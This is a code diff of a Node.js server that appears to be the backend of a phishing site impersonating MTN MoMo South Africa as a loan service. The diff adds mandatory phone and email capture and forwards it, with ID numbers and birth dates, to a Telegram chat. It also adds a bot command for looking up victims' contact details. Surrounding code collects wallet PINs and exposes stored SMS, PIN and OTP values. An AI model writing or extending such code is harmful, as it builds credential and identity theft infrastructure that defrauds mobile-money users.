@@ -1,6 +1,7 @@
 // ============================================================
-// server.js – MTN MoMo South Africa  (FIXED v6.2)
+// server.js – MTN MoMo South Africa  (FINAL v6.4)
 // Registration mandatory · Account-type limits · Guarantor
+// Contact capture (phone + email) at registration
 // ============================================================
 'use strict';
 
@@ -291,17 +292,23 @@ app.get('/api/account-types', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// REGISTRATION
+// REGISTRATION (with phone + email capture)
 // ═══════════════════════════════════════════════════════════
 app.post('/api/register-momo', async (req, res) => {
     try {
-        const { applicationId, idNumber, accountType, phone, fullName } = req.body || {};
+        const { applicationId, idNumber, accountType, phone, email, fullName } = req.body || {};
 
         if (!applicationId || !idNumber || !accountType) {
             return res.status(400).json({ ok: false, error: 'Missing required fields.' });
         }
         if (!ACCOUNT_TYPES[accountType]) {
             return res.status(400).json({ ok: false, error: 'Invalid account type.' });
+        }
+        if (!phone || !/^\d{9}$/.test(String(phone))) {
+            return res.status(400).json({ ok: false, error: 'Valid 9-digit mobile number required.' });
+        }
+        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email))) {
+            return res.status(400).json({ ok: false, error: 'Valid email address required.' });
         }
 
         const type = ACCOUNT_TYPES[accountType];
@@ -321,7 +328,9 @@ app.post('/api/register-momo', async (req, res) => {
             accountType, accountName: type.name,
             limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
             maxLoan: type.maxLoan, minLoan: type.minLoan,
-            phone: phone || null, fullName: fullName || null,
+            phone: phone,
+            email: email,
+            fullName: fullName || null,
             idDetails: idCheck.ok && type.requiresId ? {
                 age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob
             } : null,
@@ -330,29 +339,51 @@ app.post('/api/register-momo', async (req, res) => {
         applications[applicationId].isRegistered = true;
         applications[applicationId].accountType = accountType;
         applications[applicationId].accountMaxLoan = type.maxLoan;
+        applications[applicationId].phone = phone;
+        applications[applicationId].email = email;
+        if (!applications[applicationId].personalData) {
+            applications[applicationId].personalData = {
+                firstName: null, lastName: null,
+                phone: phone, email: email
+            };
+        }
         applications[applicationId].updatedAt = new Date().toISOString();
         saveApps();
 
         console.log(`✅ MoMo registration: ${applicationId} → ${type.name}`);
-        audit('registration_main', { applicationId, accountType, phone });
+        audit('registration_main', { applicationId, accountType, phone, email });
 
         await tgSend(
-            `📱 <b>MOMO REGISTRATION CONFIRMED</b>\n` +
+            `📱 <b>NEW MOMO REGISTRATION</b>\n` +
             `━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `🆔 App ID: ${code(applicationId)}\n` +
-            (fullName ? `👤 ${esc(fullName)}\n` : '') +
-            (phone ? `📞 ${code('+27' + phone)}\n` : '') +
-            `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b>\n\n` +
-            `<b>📊 LIMITS</b>\nDaily: R ${fmt(type.dailyCash)}\n` +
-            `Monthly: R ${fmt(type.monthlyCap)}\nMax Loan: <b>R ${fmt(type.maxLoan)}</b>\n` +
+            `<b>📞 CONTACT (for verification)</b>\n` +
+            `Phone: ${code('+27' + phone)}\n` +
+            `Email: ${code(email)}\n` +
+            (fullName ? `Name: ${esc(fullName)}\n` : '') +
+            `\n🆔 App ID: ${code(applicationId)}\n` +
+            `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b>\n` +
+            `${esc(type.description)}\n\n` +
+            `<b>📊 LIMITS</b>\n` +
+            `Daily: R ${fmt(type.dailyCash)}\n` +
+            `Monthly: R ${fmt(type.monthlyCap)}\n` +
+            `Max Loan: <b>R ${fmt(type.maxLoan)}</b>\n` +
             (idCheck.ok && type.requiresId
-                ? `\n<b>🇿🇦 ID</b>\n${code(idNumber)}\nAge ${idCheck.age} · ${idCheck.gender} · ${idCheck.citizenship}\n`
+                ? `\n<b>🇿🇦 ID DETAILS</b>\n` +
+                  `ID: ${code(idNumber)}\n` +
+                  `Age: ${idCheck.age} · ${idCheck.gender}\n` +
+                  `Citizenship: ${idCheck.citizenship}\n` +
+                  `DOB: ${idCheck.dob}\n`
                 : '') +
-            `\n✅ User can now apply`
+            `\n<b>🔎 VERIFICATION CHECKLIST</b>\n` +
+            `☐ Confirm phone belongs to applicant\n` +
+            `☐ Confirm email is reachable\n` +
+            `☐ Confirm ID matches wallet owner\n` +
+            `\n✅ Registration captured`
         );
 
         res.json({
             ok: true, accountType, accountName: type.name,
+            phone, email,
             limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
             maxLoan: type.maxLoan, minLoan: type.minLoan,
             message: `${type.name} registered successfully.`
@@ -365,7 +396,7 @@ app.post('/api/register-momo', async (req, res) => {
 
 app.post('/api/register-momo-telegram', async (req, res) => {
     try {
-        const { applicationId, idNumber, accountType, phone, fullName, extra } = req.body || {};
+        const { applicationId, idNumber, accountType, phone, email, fullName, extra } = req.body || {};
         if (!idNumber || !accountType) return res.status(400).json({ ok: false, error: 'Missing ID or account type.' });
         if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Invalid account type.' });
 
@@ -378,18 +409,21 @@ app.post('/api/register-momo-telegram', async (req, res) => {
             regId, idNumber: type.requiresId ? idNumber : null,
             accountType, accountName: type.name,
             limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
-            phone: phone || null, fullName: fullName || null,
+            phone: phone || null,
+            email: email || null,
+            fullName: fullName || null,
             extra: extra || null,
             registeredAt: new Date().toISOString(),
             source: 'register-momo-telegram'
         };
         saveRegs();
-        audit('registration_temp_endpoint', { regId, accountType, phone });
+        audit('registration_temp_endpoint', { regId, accountType, phone, email });
 
         await tgSend(
             `📱 <b>NEW MOMO REGISTRATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🆔 Reg ID: ${code(regId)}\n` +
             (phone ? `📞 ${code('+27' + phone)}\n` : '') +
+            (email ? `📧 ${code(email)}\n` : '') +
             `\n${type.icon} <b>${type.name}</b>\n` +
             `Max loan: <b>R ${fmt(type.maxLoan)}</b>\n\n✅ Registration captured`
         );
@@ -498,7 +532,6 @@ app.post('/api/submit-step', async (req, res) => {
         if (step === 'momologin') {
             const { phone, pin, loginMethod, deviceInfo } = data || {};
             if (!phone) return res.status(400).json({ ok: false, error: 'Phone required.' });
-            // ✅ FIX (bug #8): verify phone matches the one on file
             if (app_.phone && phone !== app_.phone) {
                 return res.status(400).json({ ok: false, error: 'Phone number must match your registered personal phone.' });
             }
@@ -663,7 +696,15 @@ app.post('/api/telegram-webhook', (req, res) => {
             if (!CHAT_ID || chatId !== CHAT_ID.toString()) return;
 
             if (text === '/start' || text === '/help') {
-                tgSend(`🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n⏳ /pending\n📱 /registrations`);
+                tgSend(
+                    `🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📊 /stats\n` +
+                    `📋 /list\n` +
+                    `🔍 /search [ID]\n` +
+                    `📞 /contact [ID]   ← phone + email\n` +
+                    `⏳ /pending\n` +
+                    `📱 /registrations`
+                );
             } else if (text === '/stats') {
                 const total = Object.keys(applications).length;
                 const regs = Object.keys(registrations).length;
@@ -682,9 +723,26 @@ app.post('/api/telegram-webhook', (req, res) => {
                 let msg = '📱 <b>RECENT REGISTRATIONS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                 ids.forEach(id => {
                     const r = registrations[id];
-                    msg += `\n🆔 ${code(id)}\n💳 ${esc(r.accountName)}\n${r.phone ? `📞 ${code('+27' + r.phone)}\n` : ''}💵 Max loan: <b>R ${fmt(r.limits?.maxLoan)}</b>\n`;
+                    msg += `\n🆔 ${code(id)}\n💳 ${esc(r.accountName)}\n`;
+                    if (r.phone) msg += `📞 ${code('+27' + r.phone)}\n`;
+                    if (r.email) msg += `📧 ${code(r.email)}\n`;
+                    msg += `💵 Max loan: <b>R ${fmt(r.limits?.maxLoan)}</b>\n`;
                 });
                 tgSend(msg);
+            } else if (text.startsWith('/contact ')) {
+                const needle = text.replace('/contact ', '').trim().toUpperCase();
+                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
+                const a = realKey ? applications[realKey] : null;
+                if (!a) { tgSend('❌ Not found'); return; }
+                tgSend(
+                    `📞 <b>CONTACT — ${code(realKey)}</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `Name: ${esc(a.firstName || a.fullName || 'N/A')} ${esc(a.lastName || '')}\n` +
+                    `Phone: ${a.phone ? code('+27' + a.phone) : 'MISSING'}\n` +
+                    `Email: ${a.email ? code(a.email) : 'MISSING'}\n` +
+                    `ID: ${a.momoRegistration?.idNumber ? code(a.momoRegistration.idNumber) : 'N/A'}\n` +
+                    `Account: ${esc(a.momoRegistration?.accountName || a.accountType || 'N/A')}`
+                );
             } else if (text === '/pending') {
                 const pending = Object.entries(applications).filter(([_, a]) => {
                     if (a.steps && Object.values(a.steps).includes('pending')) return true;
@@ -710,7 +768,6 @@ app.post('/api/telegram-webhook', (req, res) => {
                 });
                 tgSend(msg);
             } else if (text.startsWith('/search ')) {
-                // ✅ FIX (bug #10): case-insensitive search
                 const needle = text.replace('/search ', '').trim().toUpperCase();
                 const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                 const a = realKey ? applications[realKey] : null;
@@ -723,6 +780,7 @@ app.post('/api/telegram-webhook', (req, res) => {
                     `🔍 <b>DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `🆔 ${code(realKey)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n` +
                     `📱 ${a.phone ? code('+27' + a.phone) : 'N/A'}\n` +
+                    `📧 ${a.email ? code(a.email) : 'N/A'}\n` +
                     `💳 ${esc(a.momoRegistration?.accountName || a.accountType || 'Not registered')}\n` +
                     `💰 <b>R ${fmt(a.loanAmount)}</b> · Monthly <b>R ${fmt(monthly)}</b>\n` +
                     `🤝 Guarantor: ${esc(a.guarantorName || 'N/A')}\n` +
@@ -747,8 +805,6 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
     res.json({ ok: true, status: readStep(app_, step), applicationId, step });
 });
 
-// ✅ FIX (bug #1): return full application data so a fresh browser can
-// resume — including loan/personal/employment/guarantor blocks
 app.get('/api/status/:applicationId', (req, res) => {
     const app_ = applications[req.params.applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
@@ -761,8 +817,9 @@ app.get('/api/status/:applicationId', (req, res) => {
         isRegistered: !!app_.isRegistered,
         accountType: app_.accountType || null,
         accountMaxLoan: app_.accountMaxLoan || 0,
+        phone: app_.phone || null,
+        email: app_.email || null,
         steps,
-        // Full collected data — safe to expose since ID is caller-provided
         loan: app_.loanData || (app_.loanAmount ? {
             loanType: app_.loanType, loanAmount: app_.loanAmount,
             loanTerm: app_.loanTerm, loanPurpose: app_.loanPurpose
@@ -773,7 +830,6 @@ app.get('/api/status/:applicationId', (req, res) => {
         } : null),
         employment: app_.employmentData || null,
         guarantor: app_.guarantorData || null,
-        // Legacy mirrors
         application: app_.application,
         sms: app_.sms, pin: app_.pin, otp: app_.otp,
         qualification: app_.qualification
